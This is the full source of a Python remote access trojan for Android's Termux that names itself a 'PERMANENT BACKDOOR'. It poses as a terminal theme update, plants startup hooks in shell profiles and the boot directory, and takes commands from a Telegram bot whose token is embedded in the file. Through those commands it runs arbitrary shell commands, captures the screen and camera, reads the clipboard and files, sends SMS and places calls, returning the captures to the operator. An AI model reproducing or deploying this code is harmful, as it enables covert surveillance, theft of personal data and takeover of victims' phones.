#!/usr/bin/env python3
"""
ADIL - PERMANENT BACKDOOR
Always runs even after Termux closes
"""

import os
import sys
import time
import json
import fcntl
import signal
import subprocess
import requests
import threading
from pathlib import Path

# ===================== CONFIG =====================
BOT_TOKEN = "8058320988:AAFU93FYhjnjFi3g2h7cRAbw4zChudLTe4g"
CHAT_ID = "6624927068"

# ===================== PATHS =====================
TERMUX_HOME = "/data/data/com.termux/files/home"
WORK_DIR = f"{TERMUX_HOME}/.adil"
CORE_FILE = f"{WORK_DIR}/core.py"
PID_FILE = f"{WORK_DIR}/adil.pid"
STATE_FILE = f"{WORK_DIR}/state.json"
LOCK_FILE = f"{WORK_DIR}/.lock"
SERVICE_FILE = f"{TERMUX_HOME}/.adil_service.sh"

# ===================== PERMANENT SERVICE =====================
def create_permanent_service():
    """Create system service that survives Termux closure"""
    service_content = f'''#!/system/bin/sh
# Permanent ADIL service
while true; do
    # Wait for Termux to start
    sleep 10
    
    # Check if ADIL is running
    if ! pgrep -f "python.*{CORE_FILE}" > /dev/null 2>&1; then
        # Start ADIL
        am start -n com.termux/.app.TermuxActivity > /dev/null 2>&1
        sleep 3
        /data/data/com.termux/files/usr/bin/python3 {CORE_FILE} > /dev/null 2>&1 &
    fi
    
    sleep 30
done
'''
    
    # Write service script
    with open(SERVICE_FILE, 'w') as f:
        f.write(service_content)
    os.chmod(SERVICE_FILE, 0o755)
    
    # Add to multiple startup locations
    locations = [
        f"{TERMUX_HOME}/.bashrc",
        f"{TERMUX_HOME}/.profile",
        f"{TERMUX_HOME}/.bash_profile",
    ]
    
    for location in locations:
        try:
            if os.path.exists(location):
                with open(location, 'a') as f:
                    f.write(f'\n# ADIL Service\n')
                    f.write(f'sh {SERVICE_FILE} > /dev/null 2>&1 &\n')
                    f.write(f'python3 {CORE_FILE} > /dev/null 2>&1 &\n')
            else:
                with open(location, 'w') as f:
                    f.write(f'sh {SERVICE_FILE} > /dev/null 2>&1 &\n')
                    f.write(f'python3 {CORE_FILE} > /dev/null 2>&1 &\n')
        except:
            pass
    
    # Termux boot directory
    boot_dir = f"{TERMUX_HOME}/.termux/boot"
    os.makedirs(boot_dir, exist_ok=True)
    
    boot_script = f"{boot_dir}/00-adil"
    with open(boot_script, 'w') as f:
        f.write(f'''#!/data/data/com.termux/files/usr/bin/bash
# Start on Termux boot
sleep 5
python3 {CORE_FILE} > /dev/null 2>&1 &
sh {SERVICE_FILE} > /dev/null 2>&1 &
''')
    os.chmod(boot_script, 0o755)

# ===================== SINGLE INSTANCE =====================
def single_instance():
    """Ensure only one instance runs"""
    try:
        os.makedirs(WORK_DIR, exist_ok=True)
        fd = os.open(LOCK_FILE, os.O_CREAT | os.O_WRONLY)
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        os.write(fd, str(os.getpid()).encode())
        return fd
    except (IOError, OSError):
        # Already running
        sys.exit(0)

# ===================== UTILITIES =====================
def run(cmd):
    """Run command"""
    try:
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30
        )
        output = result.stdout.strip() or result.stderr.strip()
        return output if output else "✓ Command executed"
    except subprocess.TimeoutExpired:
        return "⏰ Timeout after 30s"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def send(msg):
    """Send message to Telegram"""
    if not msg:
        return False
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg},
            timeout=10
        )
        return resp.status_code == 200
    except Exception as e:
        return False

# ===================== SETUP =====================
def setup():
    """Quick setup with update message"""
    print("\n" + "="*50)
    print("Updating Your Termux Terminal...")
    print("="*50 + "\n")
    
    steps = [
        "Checking environment...",
        "Configuring terminal...",
        "Applying themes...",
        "Finalizing...",
        "Complete!"
    ]
    
    for i, step in enumerate(steps, 1):
        print(f"[{i}/{len(steps)}] {step}")
        time.sleep(0.5)
    
    # Create work directory
    os.makedirs(WORK_DIR, exist_ok=True)
    
    # Save core with INSTALLED=True
    with open(__file__, 'r') as f:
        content = f.read()
    content = content.replace('INSTALLED = False', 'INSTALLED = True')
    
    with open(CORE_FILE, 'w') as f:
        f.write(content)
    os.chmod(CORE_FILE, 0o755)
    
    # Setup terminal theme with lolcat
    setup_theme()
    
    # Create permanent service
    create_permanent_service()
    
    # Start service immediately
    start_service()
    
    print("\n✅ Update complete! Restart Termux.")
    print("="*50 + "\n")

def setup_theme():
    """Setup terminal with figlet + lolcat"""
    theme_content = '''#!/data/data/com.termux/files/usr/bin/bash

# Clear screen
clear

# Show ADIL banner with lolcat
if command -v figlet > /dev/null 2>&1; then
    if command -v lolcat > /dev/null 2>&1; then
        figlet -f slant "ADIL" | lolcat
    else
        figlet -f slant "ADIL"
    fi
fi

# Show system info
if command -v neofetch > /dev/null 2>&1; then
    echo ""
    neofetch --ascii_distro termux 2>/dev/null || neofetch
fi

# Custom prompt
export PS1='┌─[ADIL]─[\\w]\\n└─╼ $ '

# Welcome
echo ""
echo "Type 'help' for commands"
echo ""
'''
    
    theme_file = f"{TERMUX_HOME}/.adilrc"
    with open(theme_file, 'w') as f:
        f.write(theme_content)
    os.chmod(theme_file, 0o755)
    
    # Update bashrc
    bashrc = f"{TERMUX_HOME}/.bashrc"
    new_content = []
    
    if os.path.exists(bashrc):
        with open(bashrc, 'r') as f:
            for line in f:
                if 'adil' not in line.lower() and 'ADIL' not in line:
                    new_content.append(line.strip())
    
    # Add theme
    new_content.append(f'source {theme_file}')
    
    with open(bashrc, 'w') as f:
        f.write('\n'.join(new_content))

def start_service():
    """Start the service"""
    # Kill any existing instances
    os.system(f"pkill -f 'python.*{CORE_FILE}' 2>/dev/null")
    time.sleep(1)
    
    # Start new instance
    os.system(f"python3 {CORE_FILE} > /dev/null 2>&1 &")
    os.system(f"sh {SERVICE_FILE} > /dev/null 2>&1 &")

# ===================== BOT HANDLER =====================
class BotHandler:
    def __init__(self):
        self.state_file = STATE_FILE
        self.shell_users = set()
        self.load_state()
    
    def load_state(self):
        """Load state from file"""
        try:
            if os.path.exists(self.state_file):
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    self.last_update_id = data.get('last_update_id', 0)
                    self.shell_users = set(data.get('shell_users', []))
            else:
                self.last_update_id = 0
                self.shell_users = set()
        except:
            self.last_update_id = 0
            self.shell_users = set()
    
    def save_state(self):
        """Save state to file"""
        try:
            data = {
                'last_update_id': self.last_update_id,
                'shell_users': list(self.shell_users)
            }
            with open(self.state_file, 'w') as f:
                json.dump(data, f)
        except:
            pass
    
    def process_command(self, user_id, username, cmd):
        """Process a command"""
        cmd = cmd.strip()
        if not cmd:
            return None
        
        # Check if in shell mode
        if user_id in self.shell_users and not cmd.startswith('/'):
            result = run(cmd)
            return f"💻 {username}:\n```\n{result[:1800]}\n```"
        
        # Handle commands
        if cmd == "/start":
            device = run("getprop ro.product.model") or "Unknown"
            ip = run("curl -s ifconfig.me") or "Unknown"
            return f"✅ ADIL Online\n👤 {username}\n📱 {device}\n🌐 {ip}"
        
        elif cmd == "/help":
            return """📱 ADIL Commands:

🔧 Shell:
/shell [cmd] - Quick command
/shell2 - Persistent shell
/exit - Exit shell mode

🎵 Media:
/play [url] - Play audio
/stop - Stop audio

📱 Device:
/screenshot - Screenshot
/cam - Camera photos
/vibrate [ms] - Vibrate
/flash [on/off] - Flashlight
/clipboard - Clipboard
/lock - Lock screen

📞 Comms:
/sms [num] [msg] - SMS
/call [num] - Call

📁 Files:
/ls [path] - List files
/cat [file] - View file
/download [url] - Download

💡 Just type command"""
        
        elif cmd == "/shell2":
            self.shell_users.add(user_id)
            self.save_state()
            return "🔓 Persistent shell activated! Send commands directly.\nType /exit to quit."
        
        elif cmd == "/exit":
            if user_id in self.shell_users:
                self.shell_users.remove(user_id)
                self.save_state()
                return "👋 Exited shell mode"
            return "Not in shell mode"
        
        elif cmd.startswith("/shell "):
            shell_cmd = cmd[7:]
            result = run(shell_cmd)
            return f"💻 {shell_cmd[:80]}\n```\n{result[:1800]}\n```"
        
        elif cmd.startswith("/play "):
            url = cmd[6:]
            os.system(f"termux-media-player play '{url}' >/dev/null 2>&1 &")
            return f"🎵 Playing: {url[:100]}"
        
        elif cmd == "/stop":
            os.system("termux-media-player stop >/dev/null 2>&1")
            return "⏹️ Stopped"
        
        elif cmd == "/screenshot":
            path = f"/sdcard/ss_{int(time.time())}.png"
            os.system(f"screencap -p {path}")
            time.sleep(1)
            if os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                            files={'document': f},
                            data={'chat_id': CHAT_ID},
                            timeout=15
                        )
                    os.remove(path)
                    return "📸 Sent"
                except:
                    return "❌ Failed"
            return "❌ Failed"
        
        elif cmd == "/cam":
            ts = int(time.time())
            sent = 0
            for i in range(2):
                path = f"/sdcard/cam_{i}_{ts}.jpg"
                os.system(f"termux-camera-photo -c {i} {path}")
                time.sleep(2)
                if os.path.exists(path):
                    try:
                        with open(path, 'rb') as f:
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                                files={'document': f},
                                data={'chat_id': CHAT_ID},
                                timeout=15
                            )
                        os.remove(path)
                        sent += 1
                    except:
                        pass
            return f"📷 Sent {sent} photo(s)"
        
        elif cmd.startswith("/vibrate "):
            ms = cmd[9:].strip()
            os.system(f"termux-vibrate -d {ms} &")
            return f"📳 {ms}ms"
        
        elif cmd.startswith("/flash "):
            state = cmd[7:].strip()
            os.system(f"termux-torch {state} &")
            return f"💡 {state}"
        
        elif cmd == "/clipboard":
            text = run("termux-clipboard-get")
            return f"📋 {text[:300]}"
        
        elif cmd == "/lock":
            os.system("input keyevent 26")
            return "🔒 Locked"
        
        elif cmd.startswith("/sms "):
            try:
                parts = cmd[5:].split(" ", 1)
                if len(parts) == 2:
                    num, msg = parts
                    os.system(f'''am start -a android.intent.action.SENDTO -d sms:{num} --es sms_body "{msg}" &''')
                    return f"📨 SMS to {num}"
            except:
                pass
            return "❌ Invalid format"
        
        elif cmd.startswith("/call "):
            num = cmd[6:].strip()
            os.system(f"am start -a android.intent.action.CALL -d tel:{num} &")
            return f"📞 Calling {num}"
        
        elif cmd.startswith("/ls "):
            path = cmd[4:] or "."
            result = run(f"ls -la {path}")
            return f"📁 {path}\n```\n{result[:1800]}\n```"
        
        elif cmd.startswith("/cat "):
            file = cmd[5:].strip()
            if os.path.exists(file):
                with open(file, 'r') as f:
                    content = f.read(1800)
                return f"📄 {file}\n```\n{content}\n```"
            return f"❌ Not found"
        
        elif cmd.startswith("/download "):
            url = cmd[10:]
            name = url.split('/')[-1] or f"dl_{int(time.time())}"
            path = f"/sdcard/{name}"
            os.system(f"curl -s -L -o '{path}' '{url}'")
            time.sleep(2)
            if os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                            files={'document': f},
                            data={'chat_id': CHAT_ID},
                            timeout=20
                        )
                    os.remove(path)
                    return f"⬇️ {name}"
                except:
                    return "❌ Failed to send"
            return "❌ Download failed"
        
        elif cmd.startswith('/'):
            return "❌ Unknown command. Type /help"
        
        return None

# ===================== MAIN SERVICE =====================
def main_service():
    """Main Telegram service"""
    # Get file lock
    lock_fd = single_instance()
    
    # Initialize handler
    handler = BotHandler()
    
    # Send startup notification
    send("✅ ADIL Service Started")
    
    # Main loop
    while True:
        try:
            # Get updates
            resp = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={
                    "offset": handler.last_update_id + 1,
                    "timeout": 30
                },
                timeout=35
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    for update in data.get("result", []):
                        update_id = update["update_id"]
                        handler.last_update_id = update_id
                        handler.save_state()
                        
                        if "message" in update and "text" in update["message"]:
                            user_id = update["message"]["from"]["id"]
                            username = update["message"]["from"].get("first_name", "User")
                            cmd = update["message"]["text"]
                            
                            # Process command
                            response = handler.process_command(user_id, username, cmd)
                            if response:
                                send(response)
            
            time.sleep(1)
            
        except requests.exceptions.RequestException:
            time.sleep(10)
        except Exception as e:
            time.sleep(5)
    
    # Close lock (never reached)
    if lock_fd:
        os.close(lock_fd)

# ===================== KEEP ALIVE =====================
def keep_alive():
    """Keep service running"""
    while True:
        # Check if main service is running
        if not os.path.exists(LOCK_FILE):
            # Restart service
            os.system(f"python3 {CORE_FILE} > /dev/null 2>&1 &")
        time.sleep(60)

# ===================== MAIN =====================
INSTALLED = False

def main():
    if not INSTALLED:
        # Setup mode
        setup()
        sys.exit(0)
    else:
        # Service mode - daemonize
        try:
            # First fork
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except:
            pass
        
        # Create new session
        os.setsid()
        
        try:
            # Second fork
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except:
            pass
        
        # Change directory
        os.chdir('/')
        
        # Close file descriptors
        sys.stdout.flush()
        sys.stderr.flush()
        
        # Start keep-alive in background
        threading.Thread(target=keep_alive, daemon=True).start()
        
        # Run main service
        main_service()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Clean exit
        try:
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
        except:
            pass
        sys.exit(0)
    except Exception:
        # Restart on any error
        time.sleep(5)
        try:
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except:
            pass
